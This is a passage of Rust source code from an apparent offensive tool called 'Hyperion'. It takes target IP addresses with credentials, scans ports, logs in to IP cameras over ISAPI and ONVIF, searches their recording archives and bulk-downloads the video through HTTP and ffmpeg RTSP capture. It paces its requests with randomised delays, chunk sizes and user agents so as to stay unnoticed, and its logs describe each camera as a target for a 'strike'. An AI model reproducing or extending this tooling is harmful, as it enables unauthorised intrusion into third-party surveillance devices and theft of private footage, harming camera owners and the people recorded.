async fn search_isapi_with_ports(
    host: &str,
    login: &str,
    pass: &str,
    clock_offset: Option<i32>,
    session_client: &Option<reqwest::Client>,
    open_ports: Option<&[u16]>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Vec<IsapiHit> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();

    let now_year = Utc::now()
        .format("%Y")
        .to_string()
        .parse::<i32>()
        .unwrap_or(2026);

    let (from, to) = match clock_offset {
        Some(skew) if skew.abs() >= 3 => {
            let cy = now_year - skew;
            (
                format!("{}-01-01T00:00:00Z", cy - 1),
                format!("{}-12-31T23:59:59Z", cy + 1),
            )
        }
        _ => (
            "2024-01-01T00:00:00Z".into(),
            "2027-12-31T23:59:59Z".into(),
        ),
    };

    let all_endpoints = vec![
        (2019u16, format!("http://{}:2019/ISAPI/ContentMgmt/search", host)),
        (80u16, format!("http://{}:80/ISAPI/ContentMgmt/search", host)),
        (8080u16, format!("http://{}:8080/ISAPI/ContentMgmt/search", host)),
    ];

    let endpoints: Vec<String> = match open_ports {
        Some(op) => all_endpoints
            .into_iter()
            .filter(|(p, _)| op.contains(p))
            .map(|(_, e)| e)
            .collect(),
        None => all_endpoints.into_iter().map(|(_, e)| e).collect(),
    };

    if endpoints.is_empty() {
        let _ = tx.send(HyperionEvent::NexusLog {
            message: "⚠️ [SEARCH] Нет открытых портов для ContentMgmt/search".into(),
        }).await;
        return vec![];
    }

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🥷 [SEARCH] Endpoints: {:?}", endpoints),
    }).await;

    let track_ids = ["101", "1", "100", "0"];

    let start_re = Regex::new(r"<startTime>([^<]+)</startTime>").unwrap();
    let end_re = Regex::new(r"<endTime>([^<]+)</endTime>").unwrap();
    let track_re = Regex::new(r"<trackID>([^<]+)</trackID>").unwrap();
    let playback_uri_re = Regex::new(r"<playbackURI>([^<]+)</playbackURI>").unwrap();
    let url_re = Regex::new(r"<url>([^<]+)</url>").unwrap();

    for endpoint in &endpoints {
        let is_2019 = endpoint.contains(":2019");
        let path = url_to_path(endpoint);

        let xml_generators: Vec<(&str, fn(&str, &str, &str) -> String)> = vec![
            ("SearchDescription+xmlns", generate_search_xml),
            ("SearchDescription plain", generate_search_xml_plain),
            ("CMSearchDescription", generate_search_xml_cm),
            ("CMSearchDescription legacy", generate_search_xml_cm_legacy),
        ];

        let mut working_gen: Option<fn(&str, &str, &str) -> String> = None;

        'probe_xml: for (gen_name, gen_fn) in &xml_generators {
            for probe_tid in &track_ids {
                sand_sleep(
                    &mut rng,
                    sand.api_delay_min_ms,
                    sand.api_delay_max_ms,
                    tx,
                    &format!("probe XML:{} TID:{}", gen_name, probe_tid),
                ).await;

                let xml = gen_fn(probe_tid, &from, &to);

                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("🧪 [PROBE] {} | {} | TID:{}", endpoint, gen_name, probe_tid),
                }).await;

                let client = if is_2019 {
                    build_ie_client(15)
                } else {
                    build_sand_client(&mut rng, 10)
                };

                let client = match client {
                    Ok(c) => c,
                    Err(e) => {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("🧪 [PROBE] client build error: {}", e),
                        }).await;
                        continue;
                    }
                };

                let resp = digest_request(
                    &client,
                    reqwest::Method::POST,
                    endpoint,
                    &path,
                    login,
                    pass,
                    Some(xml),
                    tx,
                ).await;

                match resp {
                    Ok(r) => {
                        let status = r.status().as_u16();
                        let body = r.text().await.unwrap_or_default();
                        let body_head = body.chars().take(300).collect::<String>();

                        let looks_like_search_result =
                            body.contains("<playbackURI>")
                                || body.contains("<url>")
                                || body.contains("<mediaSegmentDescriptor>")
                                || body.contains("<searchMatchItem>")
                                || body.contains("<CMSearchResult>")
                                || body.contains("<ResponseStatus");

                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!(
                                "🧪 [PROBE] {} | TID:{} → HTTP {} | {}",
                                gen_name, probe_tid, status, body_head
                            ),
                        }).await;

                        if status == 200 && looks_like_search_result {
                            let _ = tx.send(HyperionEvent::NexusLog {
                                message: format!(
                                    "✅ [PROBE] XML формат '{}' работает на TID:{}!",
                                    gen_name, probe_tid
                                ),
                            }).await;
                            working_gen = Some(*gen_fn);
                            break 'probe_xml;
                        }
                    }
                    Err(e) => {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("🧪 [PROBE] {} | TID:{} → ERR: {}", gen_name, probe_tid, e),
                        }).await;
                    }
                }
            }
        }

        let gen = match working_gen {
            Some(g) => g,
            None => {
                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!("⚠️ [SEARCH] Ни один XML формат не прошёл на {} — пропускаем", endpoint),
                }).await;
                continue;
            }
        };

        for tid in &track_ids {
            sand_sleep(
                &mut rng,
                sand.api_delay_min_ms,
                sand.api_delay_max_ms,
                tx,
                &format!("search TID:{}", tid),
            ).await;

            let xml = gen(tid, &from, &to);

            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!(
                    "🥷 [STRIKE] {} | TID:{} | {}..{}",
                    endpoint,
                    tid,
                    &from[..10],
                    &to[..10]
                ),
            }).await;

            let resp_result = if let Some(sc) = session_client {
                let r = sc.post(endpoint.as_str())
                    .header("Content-Type", "application/xml; charset=UTF-8")
                    .header("X-Requested-With", "XMLHttpRequest")
                    .header("User-Agent", IE_UA)
                    .body(xml.clone())
                    .send()
                    .await;

                match r {
                    Ok(resp) if resp.status().is_success() => Some(resp),
                    Ok(resp) => {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!(
                                "📡 [TID:{}] Cookie → HTTP {} (fallback Digest)",
                                tid,
                                resp.status().as_u16()
                            ),
                        }).await;
                        None
                    }
                    Err(e) => {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("📡 [TID:{}] Cookie → ERR: {} (fallback)", tid, e),
                        }).await;
                        None
                    }
                }
            } else {
                None
            };

            let resp_result = if resp_result.is_some() {
                resp_result
            } else {
                let client = if is_2019 {
                    build_ie_client(15)
                } else {
                    build_sand_client(&mut rng, 10)
                };

                let client = match client {
                    Ok(c) => c,
                    Err(e) => {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("❌ [TID:{}] Client build failed: {}", tid, e),
                        }).await;
                        continue;
                    }
                };

                match digest_request(
                    &client,
                    reqwest::Method::POST,
                    endpoint,
                    &path,
                    login,
                    pass,
                    Some(xml),
                    tx,
                ).await {
                    Ok(resp) => Some(resp),
                    Err(e) => {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!("❌ [TID:{}] Digest: {}", tid, e),
                        }).await;
                        None
                    }
                }
            };

            if let Some(resp) = resp_result {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();

                let _ = tx.send(HyperionEvent::NexusLog {
                    message: format!(
                        "📡 [TID:{}] HTTP {} | {} chars | body: {}",
                        tid,
                        status,
                        text.len(),
                        text.chars().take(300).collect::<String>()
                    ),
                }).await;

                if text.contains("<playbackURI>")
                    || text.contains("<url>")
                    || text.contains("<mediaSegmentDescriptor>")
                    || text.contains("<searchMatchItem>")
                    || text.contains("<CMSearchResult>")
                {
                    let starts: Vec<String> = start_re
                        .captures_iter(&text)
                        .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                        .collect();

                    let ends: Vec<String> = end_re
                        .captures_iter(&text)
                        .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                        .collect();

                    let tracks: Vec<String> = track_re
                        .captures_iter(&text)
                        .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                        .collect();

                    let mut uris: Vec<String> = playback_uri_re
                        .captures_iter(&text)
                        .filter_map(|c| {
                            c.get(1).map(|m| m.as_str().replace("&amp;", "&").trim().to_string())
                        })
                        .collect();

                    if uris.is_empty() {
                        uris = url_re
                            .captures_iter(&text)
                            .filter_map(|c| {
                                c.get(1).map(|m| m.as_str().replace("&amp;", "&").trim().to_string())
                            })
                            .collect();
                    }

                    let count = [starts.len(), ends.len(), tracks.len(), uris.len()]
                        .into_iter()
                        .max()
                        .unwrap_or(0)
                        .min(40);

                    if count > 0 {
                        let _ = tx.send(HyperionEvent::NexusLog {
                            message: format!(
                                "🎯 [JACKPOT] {} записей через TID:{} на {}",
                                count, tid, endpoint
                            ),
                        }).await;

                        return (0..count)
                            .map(|i| IsapiHit {
                                endpoint: endpoint.clone(),
                                track_id: tracks.get(i).cloned().or_else(|| Some((*tid).to_string())),
                                start_time: starts.get(i).cloned(),
                                end_time: ends.get(i).cloned(),
                                playback_uri: uris.get(i).cloned(),
                            })
                            .collect();
                    }
                }
            }
        }
    }

    vec![]
}

async fn search_onvif(host: &str, login: &str, pass: &str, tx: &mpsc::Sender<HyperionEvent>) -> Vec<OnvifHit> {
    let mut rng = SandRng::new(); let sand = SandProfile::standard();
    let client = match build_sand_client(&mut rng, 10) { Ok(c) => c, Err(_) => return vec![] };
    let soap = r#"<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl"><s:Body><trc:GetRecordings/></s:Body></s:Envelope>"#;
    let re = Regex::new(r"<[^>]*RecordingToken[^>]*>([^<]+)</[^>]+>").unwrap();
    for ep in &[format!("http://{}:80/onvif/recording_service",host), format!("http://{}:2019/onvif/recording_service",host)] {
        sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "ONVIF search").await;
        let req = client.post(ep.as_str()).header("Content-Type","application/soap+xml; charset=utf-8").basic_auth(login, Some(pass)).body(soap.to_string());
        if let Ok(r) = apply_sand_headers(&mut rng, req).send().await {
            if r.status().is_success() || r.status().as_u16() == 401 {
                let text = r.text().await.unwrap_or_default();
                let out: Vec<OnvifHit> = re.captures_iter(&text).filter_map(|c| c.get(1).map(|m| OnvifHit { endpoint: ep.clone(), token: m.as_str().trim().to_string() })).collect();
                if !out.is_empty() { return out; }
            }
        }
    }
    vec![]
}

// =============================================================================
// 7. TRANSPORT (Cookie → Digest → Sand chunking)
// =============================================================================

async fn sand_download_isapi_stream(
    client: &reqwest::Client, url: &str, path: &str, login: &str, pass: &str,
    filename: &str, fpath: &std::path::Path, task_key: &str,
    session_client: &Option<reqwest::Client>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    use futures_util::StreamExt;
    let mut rng = SandRng::new();

    // Cookie-first, потом Digest
    let resp = if let Some(sc) = session_client {
        let r = sc.get(url).header("X-Requested-With","XMLHttpRequest").header("User-Agent",IE_UA).send().await;
        match r { Ok(resp) if resp.status().is_success() => resp, _ => digest_download_request(client, url, path, login, pass, vec![], tx).await? }
    } else { digest_download_request(client, url, path, login, pass, vec![], tx).await? };

    if !resp.status().is_success() { return Err(format!("HTTP {}", resp.status().as_u16())); }
    let mut stream = resp.bytes_stream();
    let mut file = std::fs::OpenOptions::new().create(true).write(true).truncate(true).open(fpath).map_err(|e| e.to_string())?;
    let mut written: u64 = 0; let mut next_mark: u64 = 2*1024*1024;
    while let Some(chunk) = stream.next().await {
        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        written += data.len() as u64;
        if written >= next_mark {
            let _ = tx.send(HyperionEvent::NexusLog { message: format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, written) }).await;
            next_mark += 2*1024*1024;
            tokio::time::sleep(Duration::from_millis(rng.range(80,250))).await;
        }
    }
    let _ = tx.send(HyperionEvent::NexusLog { message: format!("🏖️ [SAND] Stream done: {} ({} bytes)", filename, written) }).await;
    Ok(fpath.to_string_lossy().to_string())
}

async fn sand_download_isapi(
    playback_uri: &str,
    login: &str,
    pass: &str,
    filename_hint: &str,
    session_client: &Option<reqwest::Client>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    let mut rng = SandRng::new();
    let sand = SandProfile::standard();
    let task_key = format!("nexus_isapi_{}", Utc::now().timestamp_millis());

    // Нормализуем URI
    let playback_uri = playback_uri
        .trim()
        .replace("&amp;", "&")
        .replace("&AMP;", "&");

    let playback_uri_lc = playback_uri.to_ascii_lowercase();

    // === RTSP ветка: сразу через ffmpeg, а не через reqwest ===
    if playback_uri_lc.starts_with("rtsp://") || playback_uri_lc.starts_with("rtsps://") {
        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("🏖️ [SAND] RTSP URI detected → FFmpeg export"),
        }).await;

        let authed_uri = inject_rtsp_credentials(&playback_uri, login, pass);

        let dir = get_vault_path().join("archives").join("nexus_isapi_rtsp");
        let _ = std::fs::create_dir_all(&dir);

        let mut filename = sanitize_filename(filename_hint);
        if filename.is_empty() {
            filename = format!("isapi_rtsp_{}.mp4", Utc::now().timestamp());
        }
        if !filename.contains('.') {
            filename.push_str(".mp4");
        }

        let fpath = dir.join(&filename);

        let status = std::process::Command::new(get_ffmpeg_path())
            .args([
                "-y",
                "-rtsp_transport", "tcp",
                "-i", &authed_uri,
                "-c", "copy",
                &fpath.to_string_lossy(),
            ])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map_err(|e| format!("ffmpeg launch error: {}", e))?;

        if status.success() {
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!("🏖️ [SAND] RTSP DONE: {}", filename),
            }).await;

            return Ok(fpath.to_string_lossy().to_string());
        } else {
            return Err("ffmpeg failed on RTSP export".into());
        }
    }

    // === старый HTTP/ISAPI путь ===
    let is_2019 = playback_uri.contains(":2019");
    let ua = if is_2019 { IE_UA.to_string() } else { rng.pick(UA_POOL).to_string() };

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] Сессия {} | has_cookie={}", task_key, session_client.is_some()),
    }).await;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .user_agent(&ua)
        .build()
        .map_err(|e| e.to_string())?;

    let path = url_to_path(&playback_uri);

    // HEAD для размера (Cookie-first)
    let head_resp = if let Some(sc) = session_client {
        sc.head(&playback_uri)
            .header("X-Requested-With", "XMLHttpRequest")
            .send()
            .await
            .ok()
    } else {
        None
    };

    let total_size = head_resp
        .and_then(|r| if r.status().is_success() { r.content_length() } else { None })
        .unwrap_or(0);

    let dir = get_vault_path().join("archives").join("nexus_isapi");
    let _ = std::fs::create_dir_all(&dir);

    let mut filename = sanitize_filename(filename_hint);
    if filename.is_empty() {
        filename = format!("isapi_{}.mp4", Utc::now().timestamp());
    }
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let fpath = dir.join(&filename);

    if total_size == 0 {
        return sand_download_isapi_stream(
            &client,
            &playback_uri,
            &path,
            login,
            pass,
            &filename,
            &fpath,
            &task_key,
            session_client,
            tx,
        ).await;
    }

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!("🏖️ [SAND] {:.1}MB chunked download", total_size as f64 / 1_048_576.0),
    }).await;

    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&fpath)
        .map_err(|e| e.to_string())?;

    let mut current: u64 = 0;
    let mut chunk_n = 0u32;
    let started = Instant::now();

    while current < total_size {
        let sz = rng.range(sand.chunk_min, sand.chunk_max);
        let end = (current + sz - 1).min(total_size - 1);
        let range_hdr = format!("bytes={}-{}", current, end);

        let resp = if let Some(sc) = session_client {
            let r = sc.get(&playback_uri)
                .header("Range", &range_hdr)
                .header("X-Requested-With", "XMLHttpRequest")
                .send()
                .await;

            match r {
                Ok(resp) if resp.status().as_u16() == 206 || resp.status().is_success() => Ok(resp),
                _ => digest_download_request(
                    &client,
                    &playback_uri,
                    &path,
                    login,
                    pass,
                    vec![("Range", range_hdr.clone())],
                    tx,
                ).await,
            }
        } else {
            digest_download_request(
                &client,
                &playback_uri,
                &path,
                login,
                pass,
                vec![("Range", range_hdr.clone())],
                tx,
            ).await
        };

        let resp = resp?;
        let status = resp.status().as_u16();

        if status != 206 && status != 200 {
            if chunk_n == 0 {
                drop(file);
                let _ = std::fs::remove_file(&fpath);

                return sand_download_isapi_stream(
                    &client,
                    &playback_uri,
                    &path,
                    login,
                    pass,
                    &filename,
                    &fpath,
                    &task_key,
                    session_client,
                    tx,
                ).await;
            }
            return Err(format!("chunk#{} HTTP {}", chunk_n, status));
        }

        let data = resp.bytes().await.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;

        current += data.len() as u64;
        chunk_n += 1;

        if chunk_n % 4 == 0 || current >= total_size {
            let _ = tx.send(HyperionEvent::NexusLog {
                message: format!(
                    "🏖️ [SAND] #{} {:.1}/{:.1}MB ({:.0}%)",
                    chunk_n,
                    current as f64 / 1_048_576.0,
                    total_size as f64 / 1_048_576.0,
                    (current as f64 / total_size as f64) * 100.0
                ),
            }).await;
        }

        let _ = tx.send(HyperionEvent::NexusLog {
            message: format!("DOWNLOAD_PROGRESS|{}|{}|{}", task_key, current, total_size),
        }).await;

        if current < total_size {
            tokio::time::sleep(Duration::from_millis(
                rng.range(sand.delay_min_ms, sand.delay_max_ms)
            )).await;
        }
    }

    let _ = tx.send(HyperionEvent::NexusLog {
        message: format!(
            "🏖️ [SAND] DONE: {} | {}chunks | {:.1}s",
            filename,
            chunk_n,
            started.elapsed().as_secs_f64()
        ),
    }).await;

    Ok(fpath.to_string_lossy().to_string())
}

async fn sand_download_onvif(
    endpoint: &str, token: &str, login: &str, pass: &str, filename_hint: &str,
    _session_client: &Option<reqwest::Client>,
    tx: &mpsc::Sender<HyperionEvent>,
) -> Result<String, String> {
    let mut rng = SandRng::new(); let sand = SandProfile::standard();
    let client = if endpoint.contains(":2019") { build_ie_client(45)? } else { build_sand_client(&mut rng, 45)? };
    sand_sleep(&mut rng, sand.api_delay_min_ms, sand.api_delay_max_ms, tx, "pre-GetReplayUri").await;

    let soap = format!(r#"<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema"><s:Body><trp:GetReplayUri><trp:StreamSetup><tt:Stream>RTP-Unicast</tt:Stream><tt:Transport><tt:Protocol>RTSP</tt:Protocol></tt:Transport></trp:StreamSetup><trp:RecordingToken>{}</trp:RecordingToken></trp:GetReplayUri></s:Body></s:Envelope>"#, token);
    let path = url_to_path(endpoint);
    let resp = digest_request(&client, reqwest::Method::POST, endpoint, &path, login, pass, Some(soap), tx).await?;
    let body = resp.text().await.map_err(|e| e.to_string())?;
    let uri_re = Regex::new(r"<[^>]*Uri[^>]*>([^<]+)</[^>]+>").map_err(|e| e.to_string())?;
    let replay_uri = uri_re.captures(&body).and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string())).ok_or("ONVIF replay URI не найден")?;

    sand_sleep(&mut rng, 500, 1500, tx, "pre-ffmpeg").await;
    let dir = get_vault_path().join("archives").join("nexus_onvif"); let _ = std::fs::create_dir_all(&dir);
    let mut filename = sanitize_filename(filename_hint);
    if filename.is_empty() { filename = format!("onvif_{}.mp4", Utc::now().timestamp()); }
    if !filename.contains('.') { filename.push_str(".mp4"); }
    let fpath = dir.join(&filename);
    let ffmpeg = get_ffmpeg_path();

    let mut child = std::process::Command::new(&ffmpeg)
        .args(["-y","-rtsp_transport","tcp","-i",&replay_uri,"-t","120","-c","copy",&fpath.to_string_lossy()])
        .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::piped())
        .spawn().map_err(|e| format!("ffmpeg: {}", e))?;
    let started = Instant::now();
    let task_key = format!("nexus_onvif_{}", Utc::now().timestamp_millis());
    loop {
        match child.try_wait() {
            Ok(Some(s)) => { if !s.success() { return Err("ffmpeg error".into()); } break; }
            Ok(None) => {
                if started.elapsed() > Duration::from_secs(180) { let _ = child.kill(); return Err("ffmpeg timeout".into()); }
                tokio::time::sleep(Duration::from_secs(2)).await;
                if let Ok(m) = std::fs::metadata(&fpath) { if m.len() > 0 { let _ = tx.send(HyperionEvent::NexusLog { message: format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, m.len()) }).await; } }
            }
            Err(e) => return Err(format!("ffmpeg: {}", e)),
        }
    }
    let sz = std::fs::metadata(&fpath).map(|m| m.len()).unwrap_or(0);
    let _ = tx.send(HyperionEvent::NexusLog { message: format!("🏖️ ONVIF done: {} ({} bytes)", filename, sz) }).await;
    Ok(fpath.to_string_lossy().to_string())
}

// =============================================================================
// 8. ОРКЕСТРАТОР
// =============================================================================
pub struct HyperionMaster { pub tx: mpsc::Sender<HyperionEvent> }

impl HyperionMaster {
    pub fn boot_with_log_bridge() -> (Self, mpsc::Receiver<String>) {
        println!("🚀 [HYPERION] Session + Digest + Sand Engine v5");
        let (tx, mut rx) = mpsc::channel::<HyperionEvent>(1000);
        let (log_tx, log_rx) = mpsc::channel::<String>(500);
        let tx_i = tx.clone();

        tokio::spawn(async move {
            while let Some(event) = rx.recv().await {
                if let HyperionEvent::NexusLog { ref message } = event { let _ = log_tx.send(message.clone()).await; continue; }
                let summary = match &event {
                    HyperionEvent::TargetDiscovered { ip, port, .. } => Some(format!("☢️ [NEXUS] Цель: {}:{}", ip, port)),
                    HyperionEvent::AnalyzeTarget { ip, .. } => Some(format!("🧠 [BRAIN] Анализ {}", ip)),
                    HyperionEvent::TargetAnalyzed { ip, vendor, device_model, camera_time_offset, .. } => Some(format!("⚖️ [VERDICT] {}: {} ({}) clock={:?}", ip, vendor, device_model.as_deref().unwrap_or("?"), camera_time_offset)),
                    HyperionEvent::ExecuteStrike { ip, vendor, .. } => Some(format!("🥷 [SPETSNAZ] Штурм {} ({})", ip, vendor)),
                    HyperionEvent::ExtractIntel { ip, isapi_recordings, onvif_recordings, .. } => Some(format!("🔑 [CIPHER] ISAPI:{} ONVIF:{} для {}", isapi_recordings.len(), onvif_recordings.len(), ip)),
                    HyperionEvent::TransportCargo { ip, download_tasks, .. } => Some(format!("🚚 [TRANSPORT] {} задач для {}", download_tasks.len(), ip)),
                    HyperionEvent::OperationComplete { ip, result } => Some(format!("✅ [COMPLETE] {} : {}", ip, result)),
                    HyperionEvent::OperationFailed { ip, reason } => Some(format!("❌ [FAILED] {} : {}", ip, reason)),
                    _ => None,
                };
                if let Some(msg) = summary { let _ = log_tx.send(msg).await; }

                match event {
                    HyperionEvent::TargetDiscovered { ip, port, login, pass } => {
                        let _ = tx_i.send(HyperionEvent::AnalyzeTarget { ip, port, login, pass }).await;
                    }
                    HyperionEvent::AnalyzeTarget { ip, port, login, pass } => {
                        let tx_b = tx_i.clone();
                        tokio::spawn(async move {
                            let host = normalize_host(&ip);
                            if host.is_empty() { let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "Пустой хост".into() }).await; return; }
                            let mut rng = SandRng::new();

                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 Порты {}...", host) }).await;
                            let open_ports = scan_ports(&host, &tx_b).await;
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 Открыты: {:?}", open_ports) }).await;
                            if open_ports.is_empty() { let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "Порты закрыты".into() }).await; return; }

                            sand_sleep(&mut rng, 300, 800, &tx_b, "inter-phase").await;
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: "🧠 ISAPI/ONVIF probe...".into() }).await;
                            let (isapi_ep, onvif_ep) = tokio::join!(probe_isapi_with_ports(&host, &login, &pass, Some(&open_ports), &tx_b), probe_onvif(&host, &tx_b));
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 ISAPI: {} | ONVIF: {}", isapi_ep.as_deref().unwrap_or("—"), onvif_ep.as_deref().unwrap_or("—")) }).await;
                            if isapi_ep.is_none() && onvif_ep.is_none() { let _ = tx_b.send(HyperionEvent::OperationFailed { ip, reason: "ISAPI/ONVIF не найдены".into() }).await; return; }

                            sand_sleep(&mut rng, 200, 600, &tx_b, "pre-vendor").await;
                            let (vendor, model, clock) = fetch_device_info(&host, &login, &pass, &tx_b).await;
                            let _ = tx_b.send(HyperionEvent::NexusLog { message: format!("🧠 {} | {} | clock={:?}", vendor, model.as_deref().unwrap_or("n/a"), clock) }).await;

                            let _ = tx_b.send(HyperionEvent::TargetAnalyzed {
                                ip, port, login, pass, vendor, open_ports,
                                isapi_endpoint: isapi_ep, onvif_endpoint: onvif_ep,
                                device_model: model, camera_time_offset: clock,
                            }).await;
                        });
                    }
                    HyperionEvent::TargetAnalyzed { ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset, open_ports, .. } => {
                        if isapi_endpoint.is_some() || onvif_endpoint.is_some() {
                            let _ = tx_i.send(HyperionEvent::ExecuteStrike { ip, port, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset, open_ports }).await;
                        } else {
                            let _ = tx_i.send(HyperionEvent::OperationFailed { ip, reason: "Нет протоколов".into() }).await;
                        }
                    }

                    // === EXECUTE STRIKE: Session login → Search ===
                    HyperionEvent::ExecuteStrike { ip, login, pass, vendor, isapi_endpoint, onvif_endpoint, camera_time_offset, open_ports, .. } => {
                        let tx_s = tx_i.clone();
                        tokio::spawn(async move {
                            let host = normalize_host(&ip);
                            let mut rng = SandRng::new();
                            sand_sleep(&mut rng, 500, 1500, &tx_s, "pre-strike").await;

                            // 🔑 ПОЛУЧАЕМ БОЕВУЮ СЕССИЮ (SHA-256) — с учётом открытых портов
                            let session_client = if isapi_endpoint.is_some() {
                                let _ = tx_s.send(HyperionEvent::NexusLog { message: "🔑 [TOKEN] Запрос боевой сессии...".into() }).await;
                                azgura_session_login_with_ports(&host, &login, &pass, Some(&open_ports), &tx_s).await
                            } else { None };

                            let (ih, oh) = tokio::join!(
                                async {
                                    if isapi_endpoint.is_some() {
                                        search_isapi_with_ports(&host, &login, &pass, camera_time_offset, &session_client, Some(&open_ports), &tx_s).await
                                    } else { vec![] }
                                },
                                async {
                                    if onvif_endpoint.is_some() { search_onvif(&host, &login, &pass, &tx_s).await } else { vec![] }
                                }
                            );

                            let _ = tx_s.send(HyperionEvent::NexusLog { message: format!("🥷 Итог: ISAPI={}, ONVIF={}", ih.len(), oh.len()) }).await;
                            if ih.is_empty() && oh.is_empty() {
                                let _ = tx_s.send(HyperionEvent::OperationFailed { ip, reason: "Записи не найдены".into() }).await;
                                return;
                            }
                            let _ = tx_s.send(HyperionEvent::ExtractIntel { ip, login, pass, vendor, isapi_recordings: ih, onvif_recordings: oh }).await;
                        });
                    }

                    HyperionEvent::ExtractIntel { ip, login, pass, isapi_recordings, onvif_recordings, .. } => {
                        let mut tasks: Vec<DownloadTask> = Vec::new();
                        for (i, hit) in isapi_recordings.iter().enumerate() {
                            if let Some(ref uri) = hit.playback_uri {
                                tasks.push(DownloadTask::IsapiPlayback { playback_uri: uri.clone(), login: login.clone(), pass: pass.clone(),
                                    filename_hint: format!("isapi_{}_{}_{}.mp4", normalize_host(&ip), hit.track_id.as_deref().unwrap_or("trk"), i) });
                            }
                        }
                        for (i, hit) in onvif_recordings.iter().enumerate() {
                            tasks.push(DownloadTask::OnvifToken { endpoint: hit.endpoint.replace("recording_service","replay_service"),
                                recording_token: hit.token.clone(), login: login.clone(), pass: pass.clone(),
                                filename_hint: format!("onvif_{}_{}.mp4", normalize_host(&ip), i) });
                        }
                        let _ = tx_i.send(HyperionEvent::NexusLog { message: format!("🔑 {} задач для {}", tasks.len(), ip) }).await;
                        if tasks.is_empty() {
                            let _ = tx_i.send(HyperionEvent::OperationComplete { ip, result: "Записи без URI".into() }).await;
                        } else {
                            let _ = tx_i.send(HyperionEvent::TransportCargo { ip, login, pass, download_tasks: tasks }).await;
                        }
                    }

                    // === TRANSPORT: session → download ===
                    HyperionEvent::TransportCargo { ip, login, pass, download_tasks } => {
                        let tx_t = tx_i.clone();
                        tokio::spawn(async move {
                            let host = normalize_host(&ip);
                            let total = download_tasks.len();
                            let mut ok = 0usize; let mut fail = 0usize;
                            let mut rng = SandRng::new(); let sand = SandProfile::standard();

                            // Одна сессия на весь транспорт
                            let session_client = azgura_session_login(&host, &login, &pass, &tx_t).await;

                            for (i, task) in download_tasks.into_iter().enumerate() {
                                if i > 0 { sand_sleep(&mut rng, sand.task_delay_min_ms, sand.task_delay_max_ms, &tx_t, &format!("inter-task {}/{}", i+1, total)).await; }
                                let _ = tx_t.send(HyperionEvent::NexusLog { message: format!("🚚 Задача {}/{}", i+1, total) }).await;
                                let res = match task {
                                    DownloadTask::IsapiPlayback { playback_uri, login, pass, filename_hint } =>
                                        sand_download_isapi(&playback_uri, &login, &pass, &filename_hint, &session_client, &tx_t).await,
                                    DownloadTask::OnvifToken { endpoint, recording_token, login, pass, filename_hint } =>
                                        sand_download_onvif(&endpoint, &recording_token, &login, &pass, &filename_hint, &session_client, &tx_t).await,
                                    DownloadTask::RtspCapture { source_url, filename_hint, duration_seconds } => {
                                        let dir = get_vault_path().join("archives").join("nexus_rtsp"); let _ = std::fs::create_dir_all(&dir);
                                        let p = dir.join(&filename_hint);
                                        match std::process::Command::new(get_ffmpeg_path())
                                            .args(["-y","-rtsp_transport","tcp","-i",&source_url,"-t",&duration_seconds.to_string(),"-c","copy",&p.to_string_lossy()])
                                            .stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).spawn()
                                        { Ok(mut c) => match c.wait() { Ok(s) if s.success() => Ok(p.to_string_lossy().to_string()), _ => Err("ffmpeg failed".into()) }, Err(e) => Err(format!("ffmpeg: {}",e)) }
                                    }
                                };
                                match res { Ok(_) => ok += 1, Err(e) => { fail += 1; let _ = tx_t.send(HyperionEvent::NexusLog { message: format!("🚚 ОШИБКА: {}", e) }).await; } }
                            }
